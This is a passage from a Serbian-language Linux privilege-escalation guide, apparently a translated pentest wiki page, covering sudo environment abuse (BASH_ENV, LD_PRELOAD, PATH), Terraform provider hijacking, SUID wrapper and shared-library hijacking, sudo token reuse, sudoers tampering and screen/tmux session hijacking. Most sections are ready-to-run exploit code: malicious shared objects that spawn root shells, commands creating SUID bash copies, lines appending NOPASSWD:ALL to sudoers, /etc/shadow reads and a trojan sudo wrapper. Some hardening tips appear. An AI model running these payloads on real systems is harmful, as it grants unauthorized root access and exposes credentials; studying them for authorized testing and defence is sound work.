- Proverite vlasništvo i dozvole direktorijuma keša, uključujući postojeće `.pyc` fajlove. Onemogućavanje upisa bajtkoda može smanjiti broj novih keširanja, ali ne neutrališe postojeći keš koji može da se zameni.
- Tretirajte upisive lokalne Python module i upisive direktorijume keša isto kao upisive shell skripte ili deljene biblioteke koje izvršava root.

### BASH_ENV sačuvan preko sudo env_keep → root shell

Ako sudoers čuva `BASH_ENV` (npr. `Defaults env_keep+="ENV BASH_ENV"`), možete iskoristiti Bash-ovo ponašanje pri pokretanju neinteraktivnog shell-a da biste pokrenuli proizvoljan kod kao root prilikom pozivanja dozvoljene komande.<sup>[[24]](#references)</sup>

- Zašto funkcioniše: U neinteraktivnim shell-ovima, Bash evaluira `$BASH_ENV` i učitava tu datoteku pre pokretanja ciljne skripte. Mnoga sudo pravila dozvoljavaju pokretanje skripte ili shell wrapper-a. Ako sudo čuva `BASH_ENV`, vaša datoteka se učitava sa root privilegijama.<sup>[[23]](#references)</sup>

- Zahtevi:
  - Sudo pravilo koje možete da pokrenete (bilo koja komanda koja poziva `/bin/bash` u neinteraktivnom režimu ili bilo koja bash skripta).
  - `BASH_ENV` je prisutan u `env_keep` (proverite pomoću `sudo -l`).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Ojačavanje:
  - Uklonite `BASH_ENV` (i `ENV`) iz `env_keep`, dajte prednost opciji `env_reset`.
  - Izbegavajte omotače ljuske za komande dozvoljene putem sudo; koristite minimalne binarne datoteke.
  - Razmotrite sudo I/O logovanje i upozoravanje kada se koriste sačuvane promenljive okruženja.

### Terraform putem sudo-a sa sačuvanim HOME (!env_reset)

Kada sudo dozvoljava pokretanje Terraform-a kao privilegovaniji korisnik, `!env_reset` je znak da treba proveriti koje promenljive okruženja zaista preživljavaju to konkretno pravilo. Pre nego što tretirate `.terraformrc` ili `terraform.rc` koje može da menja pozivalac kao aktivnu CLI konfiguraciju, potvrdite efektivnu vrednost `HOME` ili `TF_CLI_CONFIG_FILE`. Unos `provider_installation.dev_overrides` je relevantan samo ako fiksna Terraform komanda učitava tog provider-a i pozivalac može da smesti njegovu izvršnu datoteku u izabrani direktorijum.<sup>[[25]](#references)</sup>

- Usmerite obavezni provider na direktorijum u koji je moguće pisati i postavite zlonamerni dodatak sa nazivom provider-a (npr. `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform neće uspeti da obavi Go plugin handshake, ali će izvršiti payload kao root pre nego što se sruši, ostavljajući SUID shell.

### Zaobilaženje validacije simboličkih linkova pomoću TF_VAR override-a

Terraform promenljive mogu se proslediti pomoću environment promenljivih `TF_VAR_<name>` ako ih konkretno sudo pravilo ne uklanja. Za **čitanje** preko source-symlink-a potreban je i provider koji prati link i kopira zaštićeni rezultat na odredišnu putanju koju pozivalac može da čita. Za **upis** preko destination-symlink-a zasebno je potreban caller-controlled unos odredišta i privilegovani provider koji prati link pri upisu; naknadno pokrenut scheduled job samo je jedna od mogućih posledica. Pre testiranja bilo kog od ova dva načina, pregledajte tačno sudo ovlašćenje, relevantne `.tf` fajlove, izabranu CLI konfiguraciju i vlasništvo nad putanjama pomoću read-only komandi kao što su `sudo -l`, `stat` i `readlink`. Slabe leksičke provere, poput `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, ne razrešavaju simboličke linkove:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform razrešava simboličku vezu i kopira stvarni `/root/root.txt` na odredište koje napadač može da pročita. Isti pristup može da se koristi za **pisanje** u privilegovane putanje tako što se unapred kreiraju simboličke veze na odredištu (npr. usmeravanjem putanje odredišta provajdera unutar `/etc/cron.d/`).

### requiretty / !requiretty

Na nekim starijim distribucijama, sudo može biti konfigurisan sa opcijom `requiretty`, koja zahteva da se sudo pokreće samo iz interaktivnog TTY-ja. Ako je podešena opcija `!requiretty` (ili opcija nije navedena), sudo može da se izvršava iz neinteraktivnih konteksta kao što su reverse shell-ovi, cron poslovi ili skripte.

```bash
Defaults !requiretty
```

Ovo samo po sebi nije direktna ranjivost, ali proširuje okolnosti u kojima se mogu zloupotrebiti sudo pravila bez potrebe za punim PTY-jem.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Ako `sudo -l` prikazuje `env_keep+=PATH` ili `secure_path` koji sadrži unose u koje napadač može da upisuje (npr. `/home/<user>/bin`), neapsolutna putanja do spoljne komande unutar cilja dozvoljenog preko sudo-a može biti zasenjena.<sup>[[3]](#references)</sup> I odsustvo efektivnog `secure_path` zaslužuje proveru **ako** okruženje komande pokrenute preko sudo-a čuva `PATH` koji kontroliše pozivalac; samo odsustvo ne dokazuje da je to slučaj. Pročitajte dozvoljenu skriptu bez pokretanja, a zatim proverite tačno RunAs pravilo i pravilo za argumente, efektivnu putanju pretrage komandi i raniji direktorijum u koji može da se upisuje i kroz koji može da se prolazi, a koji sadrži ime komande. Autentifikacija, `NOEXEC`, shell ugrađene komande i apsolutne putanje do komandi mogu da utiču na ishod.

- Zahtevi: sudo pravilo (često `NOPASSWD`) koje pokreće skriptu/binarnu datoteku koja poziva komande bez apsolutnih putanja (`free`, `df`, `ps` itd.) i unos u `PATH` u koji može da se upisuje, a koji se prvi pretražuje.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Zaobilaženje putanja pri izvršavanju sudo komandi
**Pređite** na druge datoteke da biste ih čitali ili koristite **symlinks**. Na primer, u sudoers datoteci: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Ako se koristi **wildcard** (\*), još je lakše:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Mere zaštite**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo komanda/SUID binarna datoteka bez putanje do komande

Ako je **sudo dozvola** dodeljena jednoj komandi **bez navođenja putanje**: _hacker10 ALL= (root) less_ možete to da exploit-ujete promenom PATH promenljive

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Ova tehnika može da se koristi i ako **suid** binarni fajl **izvršava drugu komandu bez navođenja putanje do nje (uvek proverite sadržaj neobičnog SUID binarnog fajla pomoću** _**strings**_ **)**.

[Primeri payload-a za izvršavanje.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### SUID binarni fajl sa putanjom komande

Ako **suid** binarni fajl **izvršava drugu komandu navodeći putanju**, možete da pokušate da **izvezete funkciju** nazvanu po komandi koju SUID fajl poziva.

Na primer, ako SUID binarni fajl poziva _**/usr/sbin/service apache2 start**_, pokušajte da kreirate i izvezete funkciju:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Zatim, kada pozovete SUID binary, ova funkcija će biti izvršena

### Prilagođeni SUID copy wrappers

Root-owned SUID alat koji prihvata izvorne i odredišne putanje može preći dve različite granice poverenja. Ako sastavlja shell komandu od bilo kog argumenta (na primer, prosleđivanjem sastavljene `cp` komande funkciji `system()`), shell metaznakovi mogu da pokrenu drugu komandu sa njegovim efektivnim privilegijama. Čak i ako bezbedno poziva `cp` bez shell-a, neograničeno odredište može omogućiti proizvoljan privilegovani upis u datoteke kao što je `/etc/passwd`. Proverite kako wrapper obrađuje argumente, kako se ponaša sa efektivnim UID-om, ograničenja odredišta i da li kopirana datoteka zadržava sadržaj koji kontroliše pozivalac; generička greška `cp` komande ili sam SUID bit ne dokazuju da je bilo koja od ovih mogućnosti prisutna. Pasivno evidentirajte binary i dozvole pre bilo kakvog ručnog testiranja.

### Skripta sa dozvolom za upis koju izvršava SUID wrapper

Česta pogrešna konfiguracija prilagođene aplikacije jeste root-owned SUID binary wrapper koji izvršava skriptu, dok korisnici sa niskim privilegijama mogu da menjaju samu skriptu.

Tipičan obrazac:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Ako je `/usr/local/bin/backup.sh` upisiv, možete dodati payload komande, a zatim izvršiti SUID wrapper:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Brze provere:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Ova putanja napada naročito je česta kod omotača za „održavanje“/„rezervne kopije“ koji se isporučuju u `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Promenljiva okruženja **LD_PRELOAD** koristi se za navođenje jedne ili više deljenih biblioteka (datoteka .so) koje će učitavač učitati pre svih ostalih, uključujući standardnu C biblioteku (`libc.so`). Ovaj proces poznat je kao predučitavanje biblioteke.

Međutim, radi očuvanja bezbednosti sistema i sprečavanja zloupotrebe ove funkcije, naročito kod izvršnih datoteka **suid/sgid**, sistem nameće određene uslove:

- Učitavač zanemaruje **LD_PRELOAD** za izvršne datoteke kod kojih se stvarni ID korisnika (_ruid_) ne podudara sa efektivnim ID-om korisnika (_euid_).
- Za izvršne datoteke sa suid/sgid oznakom unapred se učitavaju samo biblioteke iz standardnih putanja koje takođe imaju suid/sgid oznaku.

Eskalacija privilegija može da se dogodi ako možete da izvršavate komande pomoću `sudo`, a izlaz komande `sudo -l` sadrži stavku **env_keep+=LD_PRELOAD**. Ova konfiguracija omogućava da se promenljiva okruženja **LD_PRELOAD** sačuva i prepozna čak i kada se komande pokreću pomoću `sudo`, što potencijalno može dovesti do izvršavanja proizvoljnog koda sa povišenim privilegijama.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Sačuvajte kao **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Zatim ga **kompajlirajte** koristeći:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Na kraju, **eskalirajte privilegije** pokretanjem

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Sličan privesc može da se zloupotrebi ako napadač kontroliše env promenljivu **LD_LIBRARY_PATH**, jer kontroliše putanju na kojoj će se tražiti biblioteke.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

Kada naiđete na binarnu datoteku sa **SUID** dozvolama koja deluje neobično, dobro je proveriti da li ispravno učitava **.so** datoteke. To možete proveriti pokretanjem sledeće komande:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Na primer, nailazak na grešku poput _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ ukazuje na potencijal za eksploataciju.

Da bi se ovo iskoristilo, potrebno je napraviti C datoteku, na primer _"/path/to/.config/libcalc.c"_, koja sadrži sledeći kod:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Ovaj kod, kada se kompajlira i izvrši, ima za cilj da eskalira privilegije manipulisanjem dozvolama datoteka i pokretanjem shell-a sa povišenim privilegijama.

Kompajlirajte gornju C datoteku u deljeni objekat (.so) pomoću:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Konačno, pokretanje pogođenog SUID binarnog fajla trebalo bi da aktivira exploit, što može dovesti do kompromitovanja sistema.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Sada kada smo pronašli SUID binarnu datoteku koja učitava biblioteku iz fascikle u koju možemo da upisujemo, napravimo biblioteku u toj fascikli pod neophodnim imenom:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Ako dobijete grešku poput

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

to znači da biblioteka koju ste generisali mora da ima funkciju pod nazivom `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) je odabrana lista Unix binarnih datoteka koje napadač može da iskoristi za zaobilaženje lokalnih bezbednosnih ograničenja. [**GTFOArgs**](https://gtfoargs.github.io/) je isto to, ali za slučajeve u kojima možete **samo da ubacujete argumente** u komandu.

Projekat prikuplja legitimne funkcije Unix binarnih datoteka koje se mogu zloupotrebiti za izlazak iz ograničenih shell okruženja, eskalaciju ili zadržavanje povišenih privilegija, prenos datoteka, pokretanje bind i reverse shells i olakšavanje drugih zadataka nakon eksploatacije.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ako možete da pristupite komandi `sudo -l`, možete da upotrebite alat [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) da proverite da li pronalazi način da se iskoristi neko sudo pravilo.

### Ponovno korišćenje sudo tokena

U slučajevima kada imate **sudo pristup**, ali ne i lozinku, možete da eskalirate privilegije tako što ćete **sačekati izvršavanje sudo komande, a zatim preoteti token sesije**.<sup>[[18]](#references)</sup>

Uslovi za eskalaciju privilegija:

- Već imate shell kao korisnik "_sampleuser_"
- "_sampleuser_" je **koristio `sudo`** za izvršavanje nečega u **poslednjih 15 minuta** (podrazumevano, to je trajanje sudo tokena koji nam omogućava da koristimo `sudo` bez unošenja lozinke)
- Vrednost komande `cat /proc/sys/kernel/yama/ptrace_scope` je 0
- `gdb` je dostupan (možete da ga otpremite)

(`ptrace_scope` možete privremeno da omogućite pomoću komande `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ili trajno tako što ćete izmeniti `/etc/sysctl.d/10-ptrace.conf` i postaviti `kernel.yama.ptrace_scope = 0`)

Ako su ispunjeni svi ovi uslovi, **možete da eskalirate privilegije pomoću:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **Prvi exploit** (`exploit.sh`) će kreirati binarnu datoteku `activate_sudo_token` u _/tmp_. Možete da je upotrebite za **aktiviranje sudo tokena u svojoj sesiji** (nećete automatski dobiti root shell; pokrenite `sudo su`):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **Drugi exploit** (`exploit_v2.sh`) će napraviti sh shell u _/tmp_ koji je u vlasništvu root-a i ima setuid.

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **Treći exploit** (`exploit_v3.sh`) će **kreirati sudoers datoteku** koja čini **sudo tokene večnim i omogućava svim korisnicima da koriste sudo**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Ako imate **dozvole za pisanje** u fascikli ili nad bilo kojom kreiranom datotekom u njoj, možete koristiti binarnu datoteku [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) da **kreirate sudo token za korisnika i PID**.\
Na primer, ako možete da prepišete datoteku _/var/run/sudo/ts/sampleuser_ i imate shell kao taj korisnik sa PID-om 1234, možete **dobiti sudo privilegije** bez poznavanja lozinke, ovako:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

Datoteka `/etc/sudoers` i datoteke unutar `/etc/sudoers.d` određuju ko može da koristi `sudo` i na koji način. Ove datoteke **po podrazumevanim podešavanjima mogu da čitaju samo korisnik root i grupa root**.\
**Ako** možete da **čitate** ovu datoteku, možda ćete moći da **dođete do zanimljivih informacija**, a ako možete da **pišete** u bilo koju datoteku, moći ćete da **eskalirate privilegije**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Ako možete da pišete, možete da zloupotrebite ovu dozvolu.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Još jedan način da se zloupotrebe ova ovlašćenja:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Postoje neke alternative za binarnu datoteku `sudo`, kao što je `doas` za OpenBSD. Ne zaboravite da proverite konfiguraciju u `/etc/doas.conf`.

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

Ako `doas` dozvoljava editor ili interpreter, proverite escape-ove u GTFOBins stilu:

```bash
doas vim
:!/bin/sh
```

Pravilo `doas` koje omogućava root pristup za originalni `dstat` zasnovan na Python-u takođe zaslužuje proveru putanja za plugin-ove. Njegov [priručnik](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) i [izvorni kod](https://github.com/dstat-real/dstat/blob/master/dstat) navode `/usr/share/dstat/` i `/usr/local/share/dstat/` među lokacijama za `dstat_*.py` plugin-ove. Ako trenutni korisnik može da upisuje u lokaciju koju instalirana verzija zaista koristi i da je pretražuje, izabrani plugin može da se pokrene sa `doas` RunAs identitetom. Potvrdite efektivno pravilo, pretragu plugin-ova u toj verziji, dozvole direktorijuma i nadređenih direktorijuma ili ACL-ove, kao i da li pozivalac može da izabere plugin; samo `dstat` pravilo ili direktorijum u koji može da se upisuje predstavlja tek trag. Druge implementacije `dstat` mogu da koriste drugačije sisteme za plugin-ove. Pasivno pregledajte metapodatke, ne učitavajte plugin.

### Otimanje sudo

Ako znate da se **korisnik obično povezuje na mašinu i koristi `sudo`** za eskalaciju privilegija, a dobili ste shell u kontekstu tog korisnika, možete **da napravite novu izvršnu datoteku sudo** koja će pokrenuti vaš kod kao root, a zatim korisnikovu komandu. Zatim **izmenite $PATH** korisničkog konteksta (na primer, dodavanjem nove putanje u .bash_profile) kako bi se pri korisnikovom pokretanju sudo izvršila vaša izvršna datoteka sudo.

Imajte na umu da ćete, ako korisnik koristi drugu shell ljusku (ne bash), morati da izmenite druge datoteke kako biste dodali novu putanju. Na primer, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) menja `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Još jedan primer možete pronaći u [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ili pokrenite nešto poput:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Deljena biblioteka

### ld.so

Datoteka `/etc/ld.so.conf` pokazuje **odakle potiču učitane konfiguracione datoteke**. Obično ova datoteka sadrži sledeću putanju: `include /etc/ld.so.conf.d/*.conf`

To znači da će konfiguracione datoteke iz `/etc/ld.so.conf.d/*.conf` biti pročitane. Ove konfiguracione datoteke **ukazuju na druge fascikle** u kojima će se **tražiti** **biblioteke**. Na primer, sadržaj datoteke `/etc/ld.so.conf.d/libc.conf` je `/usr/local/lib`. **To znači da će sistem tražiti biblioteke u fascikli `/usr/local/lib`**.

Ako iz nekog razloga **korisnik ima dozvole za pisanje** u bilo kojoj od navedenih putanja: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, bilo kojoj datoteci unutar `/etc/ld.so.conf.d/` ili bilo kojoj fascikli navedenoj u konfiguracionoj datoteci unutar `/etc/ld.so.conf.d/*.conf`, možda će moći da eskalira privilegije.\
Pogledajte **kako da iskoristite ovu pogrešnu konfiguraciju** na sledećoj stranici:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

Kopiranjem biblioteke u `/var/tmp/flag15/`, program će je koristiti sa ove lokacije, kako je navedeno u promenljivoj `RPATH`.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Zatim napravite zlonamernu biblioteku u direktorijumu `/var/tmp` pomoću komande `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

Linux capabilities pružaju **podskup dostupnih root privilegija procesu**. Time se root **privilegije efektivno dele na manje, zasebne jedinice**. Svaka od tih jedinica zatim može nezavisno da se dodeli procesima. Na taj način se smanjuje ukupan skup privilegija, čime se umanjuju rizici od eksploatacije.\
Pročitajte sledeću stranicu da biste **saznali više o capabilities i načinima njihove zloupotrebe**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Dozvole direktorijuma

U direktorijumu, **bit za „izvršavanje“** znači da korisnik na koga se odnosi može da uđe u fasciklu pomoću komande „**cd**“.\
Bit za **„čitanje“** znači da korisnik može da izlista **datoteke**, a bit za **„pisanje“** znači da može da briše i kreira nove **datoteke**.

## ACLs

Access Control Lists (ACLs) predstavljaju sekundarni sloj diskrecionih dozvola, koji može da **nadjača tradicionalne ugo/rwx dozvole**. Ove dozvole omogućavaju bolju kontrolu pristupa datotekama ili direktorijumima tako što određenim korisnicima koji nisu vlasnici niti članovi grupe dozvoljavaju ili uskraćuju prava. Ovaj nivo **preciznosti omogućava detaljnije upravljanje pristupom**. Više detalja možete pronaći [**ovde**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Dodelite** korisniku „kali“ dozvole za čitanje i pisanje nad datotekom:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Pronađite** fajlove sa određenim ACL-ovima na sistemu:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Skriveni ACL backdoor u sudoers drop-in fajlovima

Česta pogrešna konfiguracija je fajl u `/etc/sudoers.d/` u vlasništvu root-a sa dozvolama `440`, koji ipak putem ACL-a omogućava korisniku sa niskim privilegijama pristup za pisanje.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

Ako vidite nešto poput `user:alice:rw-`, korisnik može da doda sudo pravilo uprkos restriktivnim bitovima dozvola:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Ovo je putanja za postojanost ACL-a/privesc sa velikim uticajem, jer je lako prevideti je ako se pregledaju samo rezultati komande `ls -l`.

## Otvorene shell sesije

Pristup GNU Screen sesijama između korisnika zavisi od **konfiguracije i ACL-a aktivne sesije**, a ne samo od njene verzije. [GNU Screen dokumentuje](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) da mora biti kompajliran sa podrškom za više korisnika; `multiuser on` i dozvola dodeljena pomoću `acladd` ili odgovarajućeg `aclchg` omogućavaju drugom korisniku da se prikači. [Priručnik takođe zahteva setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) za pronalaženje sesije drugog korisnika. Vidljiv socket u vlasništvu root-a ili SUID `screen` binarna datoteka sami po sebi ne dokazuju da je root shell dostupan za priključivanje. Pre nego što ovo smatrate eskalacijom privilegija, potvrdite da je aktivna sesija u režimu za više korisnika, da trenutni korisnik ima efektivnu dozvolu za unos komandi i da se shell u toj sesiji izvršava kao privilegovani vlasnik.

### screen sessions hijacking

**Izlistajte screen sesije**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![screen sessions hijacking - Lokacije socket-a (neki sistemi prikazuju jednu kao simboličku vezu do druge): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Priključivanje sesiji**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux sessions hijacking

Ovo je bio problem sa **starim verzijama tmux-a**. Nisam mogao da preuzmem tmux (v2.1) sesiju koju je pokrenuo root, koristeći neprivilegovanog korisnika.

**Izlistaj tmux sesije**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Lokacije soketa (neki sistemi izlažu jedan kao simboličku vezu ka drugom) - otmica tmux sesija: tmux -S /tmp/dev sess ls Izlistajte sesije koristeći taj soket; možete pokrenuti tmux sesiju na tom soketu...](<../../images/image (837).png>)

**Povezivanje sa sesijom**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Proverite **Valentine box from HTB** za primer.

## SSH

### Predvidljivi PRNG u Debian OpenSSL-u - CVE-2008-0166

Ključevi generisani pomoću pogođenih Debian ili izvedenih OpenSSL buildova tokom istorijskog perioda ranjivosti možda imaju predvidljivu slučajnost; trenutna distribucija hosta ili zakrpljena verzija OpenSSL-a ne dokazuju kako je stariji ključ generisan. Proverite **konkretan ključ** pomoću odgovarajuće istorijske liste blokiranih ključeva i proverite njegovo poreklo. Debianov priručnik za [`ssh-vulnkey`](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) opisuje proveru javnih ključeva i datoteke `authorized_keys`, a [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) beleži ispravku za OpenSSL. Zapis u datoteci `authorized_keys` privilegovanog naloga predstavlja trag za eskalaciju samo ako je odgovarajući privatni ključ moguće oporaviti i ako efektivna SSH politika i dalje prihvata taj ključ za taj nalog; slab **host** ključ sam po sebi nije pristupni podatak za prijavu. Zamenite kompromitovane ključeve i uklonite njihova stara ovlašćenja.

### Zanimljive SSH vrednosti konfiguracije

- **PasswordAuthentication:** Određuje da li je dozvoljena autentifikacija lozinkom. Podrazumevana vrednost u upstream OpenSSH-u je `yes`; konfiguracija distribucije može je promeniti.
- **PubkeyAuthentication:** Određuje da li je dozvoljena autentifikacija javnim ključem. Podrazumevana vrednost je `yes`.
- **PermitEmptyPasswords**: Kada je autentifikacija lozinkom dozvoljena, određuje da li server dopušta prijavu nalozima sa praznim lozinkama. Podrazumevana vrednost je `no`.

### Datoteke za kontrolu prijave

Ove datoteke utiču na to ko može da se prijavi i na koji način:

- **`/etc/nologin`**: ako postoji, blokira prijave koje nisu root i prikazuje svoju poruku.
- **`/etc/securetty`**: ograničava gde root može da se prijavi (lista dozvoljenih TTY uređaja).
